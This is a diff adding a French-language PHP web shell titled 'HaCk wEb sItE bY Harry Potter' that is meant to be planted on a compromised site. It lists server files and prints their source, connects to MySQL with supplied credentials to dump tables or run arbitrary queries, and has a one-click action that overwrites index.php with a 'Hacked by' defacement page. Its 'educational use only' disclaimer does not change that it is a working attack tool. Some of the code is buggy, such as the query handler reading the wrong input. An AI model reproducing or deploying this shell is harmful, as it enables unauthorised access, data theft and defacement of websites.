@@ -1,0 +1,358 @@
+<?php
+
+	if(isset($_POST["dossier_nom"])){
+		$dossier_nom=$_POST["dossier_nom"];		
+	}else{
+		$dossier_nom = ".";
+	}
+	if(isset($_POST["host"])){
+		$bdd_login = $_POST["login"];
+		$bdd_password = $_POST["password"];
+		$bdd_host = $_POST["host"];
+		$bdd_bdd = $_POST["bdd"];
+	}else{
+		$bdd_login = "";
+		$bdd_password = "";
+		$bdd_host = "";
+		$bdd_bdd = "";
+	}
+	
+
+	echo "
+<style>
+input,select
+{
+	border:1px #00FF00 solid;
+	background-color:#000000; 
+	color:#00FF00;
+}
+</style>	
+	
+<body style=\"background-color:#000000; color:#00FF00;\">
+
+	<center><h2><font color=\"#00FF00\">HaCk wEb sItE bY</font> <font color=\"red\">Harry Potter</font></h2></center>
+	<hr color=\"#00FF00\">
+	
+	<blockquote>
+		Ce script est uniquement à usage pédagogique. Le créateur du script ne peut être tenu responsable de l'usage que vous en ferez.
+	</blockquote>
+
+	<form action=\"hack.php\" method=\"post\">
+	
+	<table width=\"80%\" align=\"center\" style=\"text-align:center\"><tr>
+	<td>
+	<center>	
+		Fichiers : 
+		<select name=\"fic_nom\">
+	";
+	
+	// AFFICHAGE DE TOUS LES FICHIERS
+	if ($handle = opendir($dossier_nom)) { 
+		while (false !== ($file = readdir($handle))) 
+		{ 
+			if (((substr($file, 0, 1) != ".") || (substr($file, 0, 2) != "..")) && ((substr($file, strlen($file)-4, 1) == ".") || (substr($file, strlen($file)-3, 1) == ".")))
+			{
+				echo "<option value=\"" . $dossier_nom . "/" . $file . "\">" . $file . "</option>\n"; 
+			}
+		}
+	}
+
+			
+	echo "
+		</select><br><br>
+		
+		Dossiers : 
+		<select name=\"dossier_nom\">
+		<option value=\"" . $dossier_nom . "\">Dossier en cours : " . $dossier_nom . "</option>
+		<option value=\".\">racine</option>	
+	";
+	
+	
+	// AFFICHAGE DE TOUS LES FICHIERS
+	if ($handle = opendir($dossier_nom)) { 
+		while (false !== ($file = readdir($handle))) 
+		{ 
+			if (((substr($file, 0, 1) != ".") || (substr($file, 0, 2) != "..")) && ((substr($file, strlen($file)-4, 1) != ".") && (substr($file, strlen($file)-3, 1) != ".")))
+			{
+				($file == $dossier_nom) ? $selected="selected" : $selected="" ;
+				echo "<option value=\"" . $file . "\" " . $selected . ">" . $file . "</option>\n"; 
+			}
+		}
+	}
+
+			
+	echo "
+		</select><br><br>
+
+		<input type=\"submit\" name=\"afficher_dossier\" value=\"afficher dossier\"> - <input type=\"submit\" name=\"afficher_fichier\" value=\"afficher fichier\"><br><br>
+	</td>
+	
+	<td>
+		<br><table align=\"center\">
+			<tr><td>Login</td><td><input type=\"text\" name=\"login\" value=\"" . $bdd_login . "\"></td></tr>
+			<tr><td>Password</td><td><input type=\"text\" name=\"password\" value=\"" . $bdd_password . "\"></td></tr>
+			<tr><td>Bdd</td><td><input type=\"text\" name=\"bdd\" value=\"" . $bdd_bdd . "\"></td></tr>
+			<tr><td>Host</td><td><input type=\"text\" name=\"host\" value=\"" . $bdd_host . "\"></td></tr>
+			<tr><td>Voir table</td><td><input type=\"text\" name=\"table\"></td></tr>
+		</table>
+		<br>
+		<input type=\"submit\" name=\"afficher_tables\" value=\"afficher la BDD\"> - <input type=\"submit\" name=\"afficher_table\" value=\"afficher la table\"><br>
+	</td>
+	
+	<td>
+		<br><br>
+		<textarea name=\"requete\" rows=\"6\"></textarea><br><br>
+		<input type=\"submit\" name=\"executer_requete\" value=\"Exécuter la requête\"><br><br>
+	</td>
+	<td>
+		<u>AUTRES</u><br><br>
+		<input type=\"submit\" name=\"defacer_site\" value=\"Defacer le site\"><br><br>
+		<input type=\"submit\" name=\"vide_bdd\" value=\"Vider la BDD\"><br><br>
+	</td>
+	</tr>
+	</table><br>
+	<hr color=\"#00FF00\">
+	</center>
+	
+	</form>";
+
+	
+// AFFICHAGE D'UN FICHIER
+if (isset($_POST["afficher_fichier"]))
+{
+	echo "&nbsp;&nbsp;<u>Affichage du fichier :</u>" . $_POST["fic_nom"];
+	
+	echo "<br><br><center><div style=\"background-color:#F3F085;border:1px #00FF00 solid;width:80%;text-align:left;\">";
+	show_source($_POST["fic_nom"]);
+	echo "</div></center>";
+
+}
+	
+// AFFICHAGE DES TABLES
+if (isset($_POST["afficher_tables"]))
+{
+
+	// Connexion a la BDD
+	@$connexion=mysql_connect($_POST["host"],$_POST["login"],$_POST["password"]) or die('Connexion impossible');
+	$base=mysql_select_db($_POST["bdd"]);
+	
+	// Recuperation des tables
+	$les_tables = mysql_query("show tables");
+	
+	echo "<br><center><div style=\"background-color:#F3F085;border:1px #00FF00 solid;color:#000000;width:80%;text-align:left;\"><blockquote>";
+	
+	while ($une_table = mysql_fetch_array($les_tables))
+	{
+		// Recuperation des infos de la table en cours
+		$info_table=mysql_query("SELECT * FROM ". $une_table[0] ."");
+		
+		// Recuperation du nb de champs de la table
+		$cols = mysql_num_fields($info_table);
+		
+		echo "<b>";
+		echo strtoupper($une_table[0]);
+		echo "</b><br><blockquote>";
+		
+		// Affichage des champs et de leur type
+		for ($j = 0; $j < $cols; $j++) {
+			$type  = mysql_field_type($info_table, $j);
+			$name  = mysql_field_name($info_table, $j);
+
+			echo "<font color=\"#OOOOAA\">" . $name . "</font> (<b>" . $type . "</b>)";
+			
+			echo "<br>";
+		}
+		echo "</blockquote><br>";
+	}
+	echo "</blockquote></div></center>";
+}
+
+
+// AFFICHAGE DES TABLES
+if (isset($_POST["afficher_table"]))
+{
+
+	// Connexion a la BDD
+	@$connexion=mysql_connect($_POST["host"],$_POST["login"],$_POST["password"]) or die('Connexion impossible');
+	$base=mysql_select_db($_POST["bdd"]);
+	
+	// Recuperation des tables
+	$res_table = mysql_query("SELECT * FROM " . $_POST["table"]);
+	
+	echo "<br><center><div style=\"background-color:#F3F085;border:1px #00FF00 solid;color:#000000;width:80%;text-align:left;\"><blockquote>";
+
+	// Recuperation du nb de champs de la table
+	$cols = mysql_num_fields($res_table);
+	
+	echo "<b>";
+	echo strtoupper($_POST["table"]);
+	echo "</b><br><table style=\"color:#000000;\">";
+	
+	// Affichage le nom des champs et de leur type
+	echo "<tr>";
+	for ($j = 0; $j < $cols; $j++) 
+	{
+		$type  = mysql_field_type($res_table, $j);
+		$name  = mysql_field_name($res_table, $j);
+		echo "<td><font color=\"#OOOOAA\">" . $name . "</font> (<b>" . $type . "</b>)</td>";
+	}
+	echo "</tr>";
+	echo "<tr><td colspan=" . $cols . "><hr color=\"#000000\"></td></tr>";
+	
+	// On affiche les donnees
+	while ($une_donnee = mysql_fetch_array($res_table))
+	{	
+		echo "<tr>";
+		for ($j = 0; $j < $cols; $j++) 
+		{
+			echo "<td>" . $une_donnee[$j] . "</td>";
+		}
+		echo "</tr>";
+	}
+	echo "</table>";
+
+	echo "</blockquote></div></center>";
+}
+	
+	
+// EXECUTER UNE REQUETE
+if (isset($_POST["executer_requete"]))
+{
+
+	// Connexion a la BDD
+	@$connexion=mysql_connect($_POST["host"],$_POST["login"],$_POST["password"]) or die('Connexion impossible');
+	$base=mysql_select_db($_POST["bdd"]);
+	
+	// Recuperation des tables
+	$resultat = mysql_query($_GET["requete"]);
+	if($resultat)
+	{
+		echo "<font color=\"green\">Requête éxécutée avec succés</font>";
+	}
+	{
+		echo "<font color=\"red\">Problème dans l'éxécution de la requête</font>";
+	}
+}
+
+
+// DEFACAGE DU SITE
+if (isset($_POST["defacer_site"]))
+{
+	echo 'Ouverture du fichier Index.php<br>';
+	$fp=fopen('index.php', 'w');
+	$msg="
+	<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'><title>HaCkEd By Harry Potter</title>
+	<style type='text/css'>
+	body{
+		font-family: Trebuchet MS, Lucida Sans Unicode, Arial, sans-serif;
+		background-color: #000000;
+		color: #00FF00;
+	}
+	#myContent, #myContent blink{
+		width:500px;
+		height:200px;
+		background:black;
+		color: #00FF00;
+		font-family:courier;
+	}    
+	blink{
+		display:inline;
+
+	}
+	</style>
+		
+	<script type='text/javascript'>
+	    var charIndex = -1;
+	    var stringLength = 0;
+	    var inputText;
+	    function writeContent(init){
+	    	if(init){
+	    		inputText = document.getElementById('contentToWrite').innerHTML;
+	    	}
+	        if(charIndex==-1){
+	            charIndex = 0;
+	            stringLength = inputText.length;
+	        }
+	        var initString = document.getElementById('myContent').innerHTML;
+			initString = initString.replace(/<SPAN.*$/gi,'');
+	        
+	        var theChar = inputText.charAt(charIndex);
+	       	var nextFourChars = inputText.substr(charIndex,4);
+	       	if(nextFourChars=='<BR>' || nextFourChars=='<br>'){
+	       		theChar  = '<BR>';
+	       		charIndex+=3;
+	       	}
+	        initString = initString + theChar + '<SPAN id=\"blink\">_</SPAN>';
+	        document.getElementById('myContent').innerHTML = initString;
+
+	        charIndex = charIndex/1 +1;
+			if(charIndex%2==1){
+	             document.getElementById('blink').style.display='none';
+	        }else{
+	             document.getElementById('blink').style.display='inline';
+	        }
+	                
+	        if(charIndex<=stringLength){
+	            setTimeout('writeContent(false)',150);
+	        }else{
+	        	blinkSpan();
+	        }  
+	    }
+	    
+	    var currentStyle = 'inline';
+	    function blinkSpan(){
+	    	if(currentStyle=='inline'){
+	    		currentStyle='none';
+	    	}else{
+	    		currentStyle='inline';
+	    	}
+	    	document.getElementById('blink').style.display = currentStyle;
+	    	setTimeout('blinkSpan()',500);
+	    	
+	    }
+	    </script>
+		<style type='text/css'>
+
+	</style></head><body>
+
+	<center>
+	  <div id='myContent'>
+
+	<span style='display: inline;' id='blink'>_</span></div>
+	<div id='contentToWrite' style='display: none;'>
+		<br><br><br><br><br>
+		Hacked by Harry Potter<br><br><br><br>
+		' Try to hack, secure the universe '<br>              
+	</div>
+	</center>
+	<br><br><br>
+
+	<div align=center>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;____\<br>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;_&nbsp;_\<br>
+	__________________/&nbsp;&nbsp;&nbsp;\_________________<br>
+	&nbsp;\_______&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_______/<br>
+	&nbsp;&nbsp;\________&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;________/<br>
+	&nbsp;&nbsp;&nbsp;&nbsp;\_______&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/&nbsp;________/<br>
+	&nbsp;&nbsp;&nbsp;\_____/\&nbsp;&nbsp;&nbsp;/\_____/<br>
+	&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;\<br>
+	&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br>
+	&nbsp;&nbsp;&nbsp;`'==='`<br>
+	</div>
+
+	<script type='text/javascript'>
+	writeContent(true);
+	</script>
+
+
+	</body></html>
+
+	";
+	echo 'Defacage du fichier Index.php<br>';
+	fwrite($fp,$msg);
+	fclose($fp);
+	echo 'JOB FINISHED';
+}
+	echo "</div>";
+
+?>  
